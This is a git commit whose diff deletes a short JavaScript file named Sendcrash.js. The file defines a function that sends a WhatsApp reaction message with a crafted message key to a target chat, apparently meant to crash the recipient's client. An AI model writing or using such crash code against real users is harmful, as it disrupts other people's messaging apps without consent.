7a87ea72e370efd8f555fd0a49fe23f22cc48c39
Xylays <aulidanraja@gmail.com>
2025-05-12 00:38:32 +0000

    add file via ssh from server

--- func/Sendcrash.js
+++
@@ -1,5 +0,0 @@
-const sendCrash = async (sock, jid) => {
-  await sock.sendMessage(jid, { react: { text: '💥', key: { remoteJid: jid, fromMe: true, id: 'BUG!' } } });
-};
-
-module.exports = sendCrash;
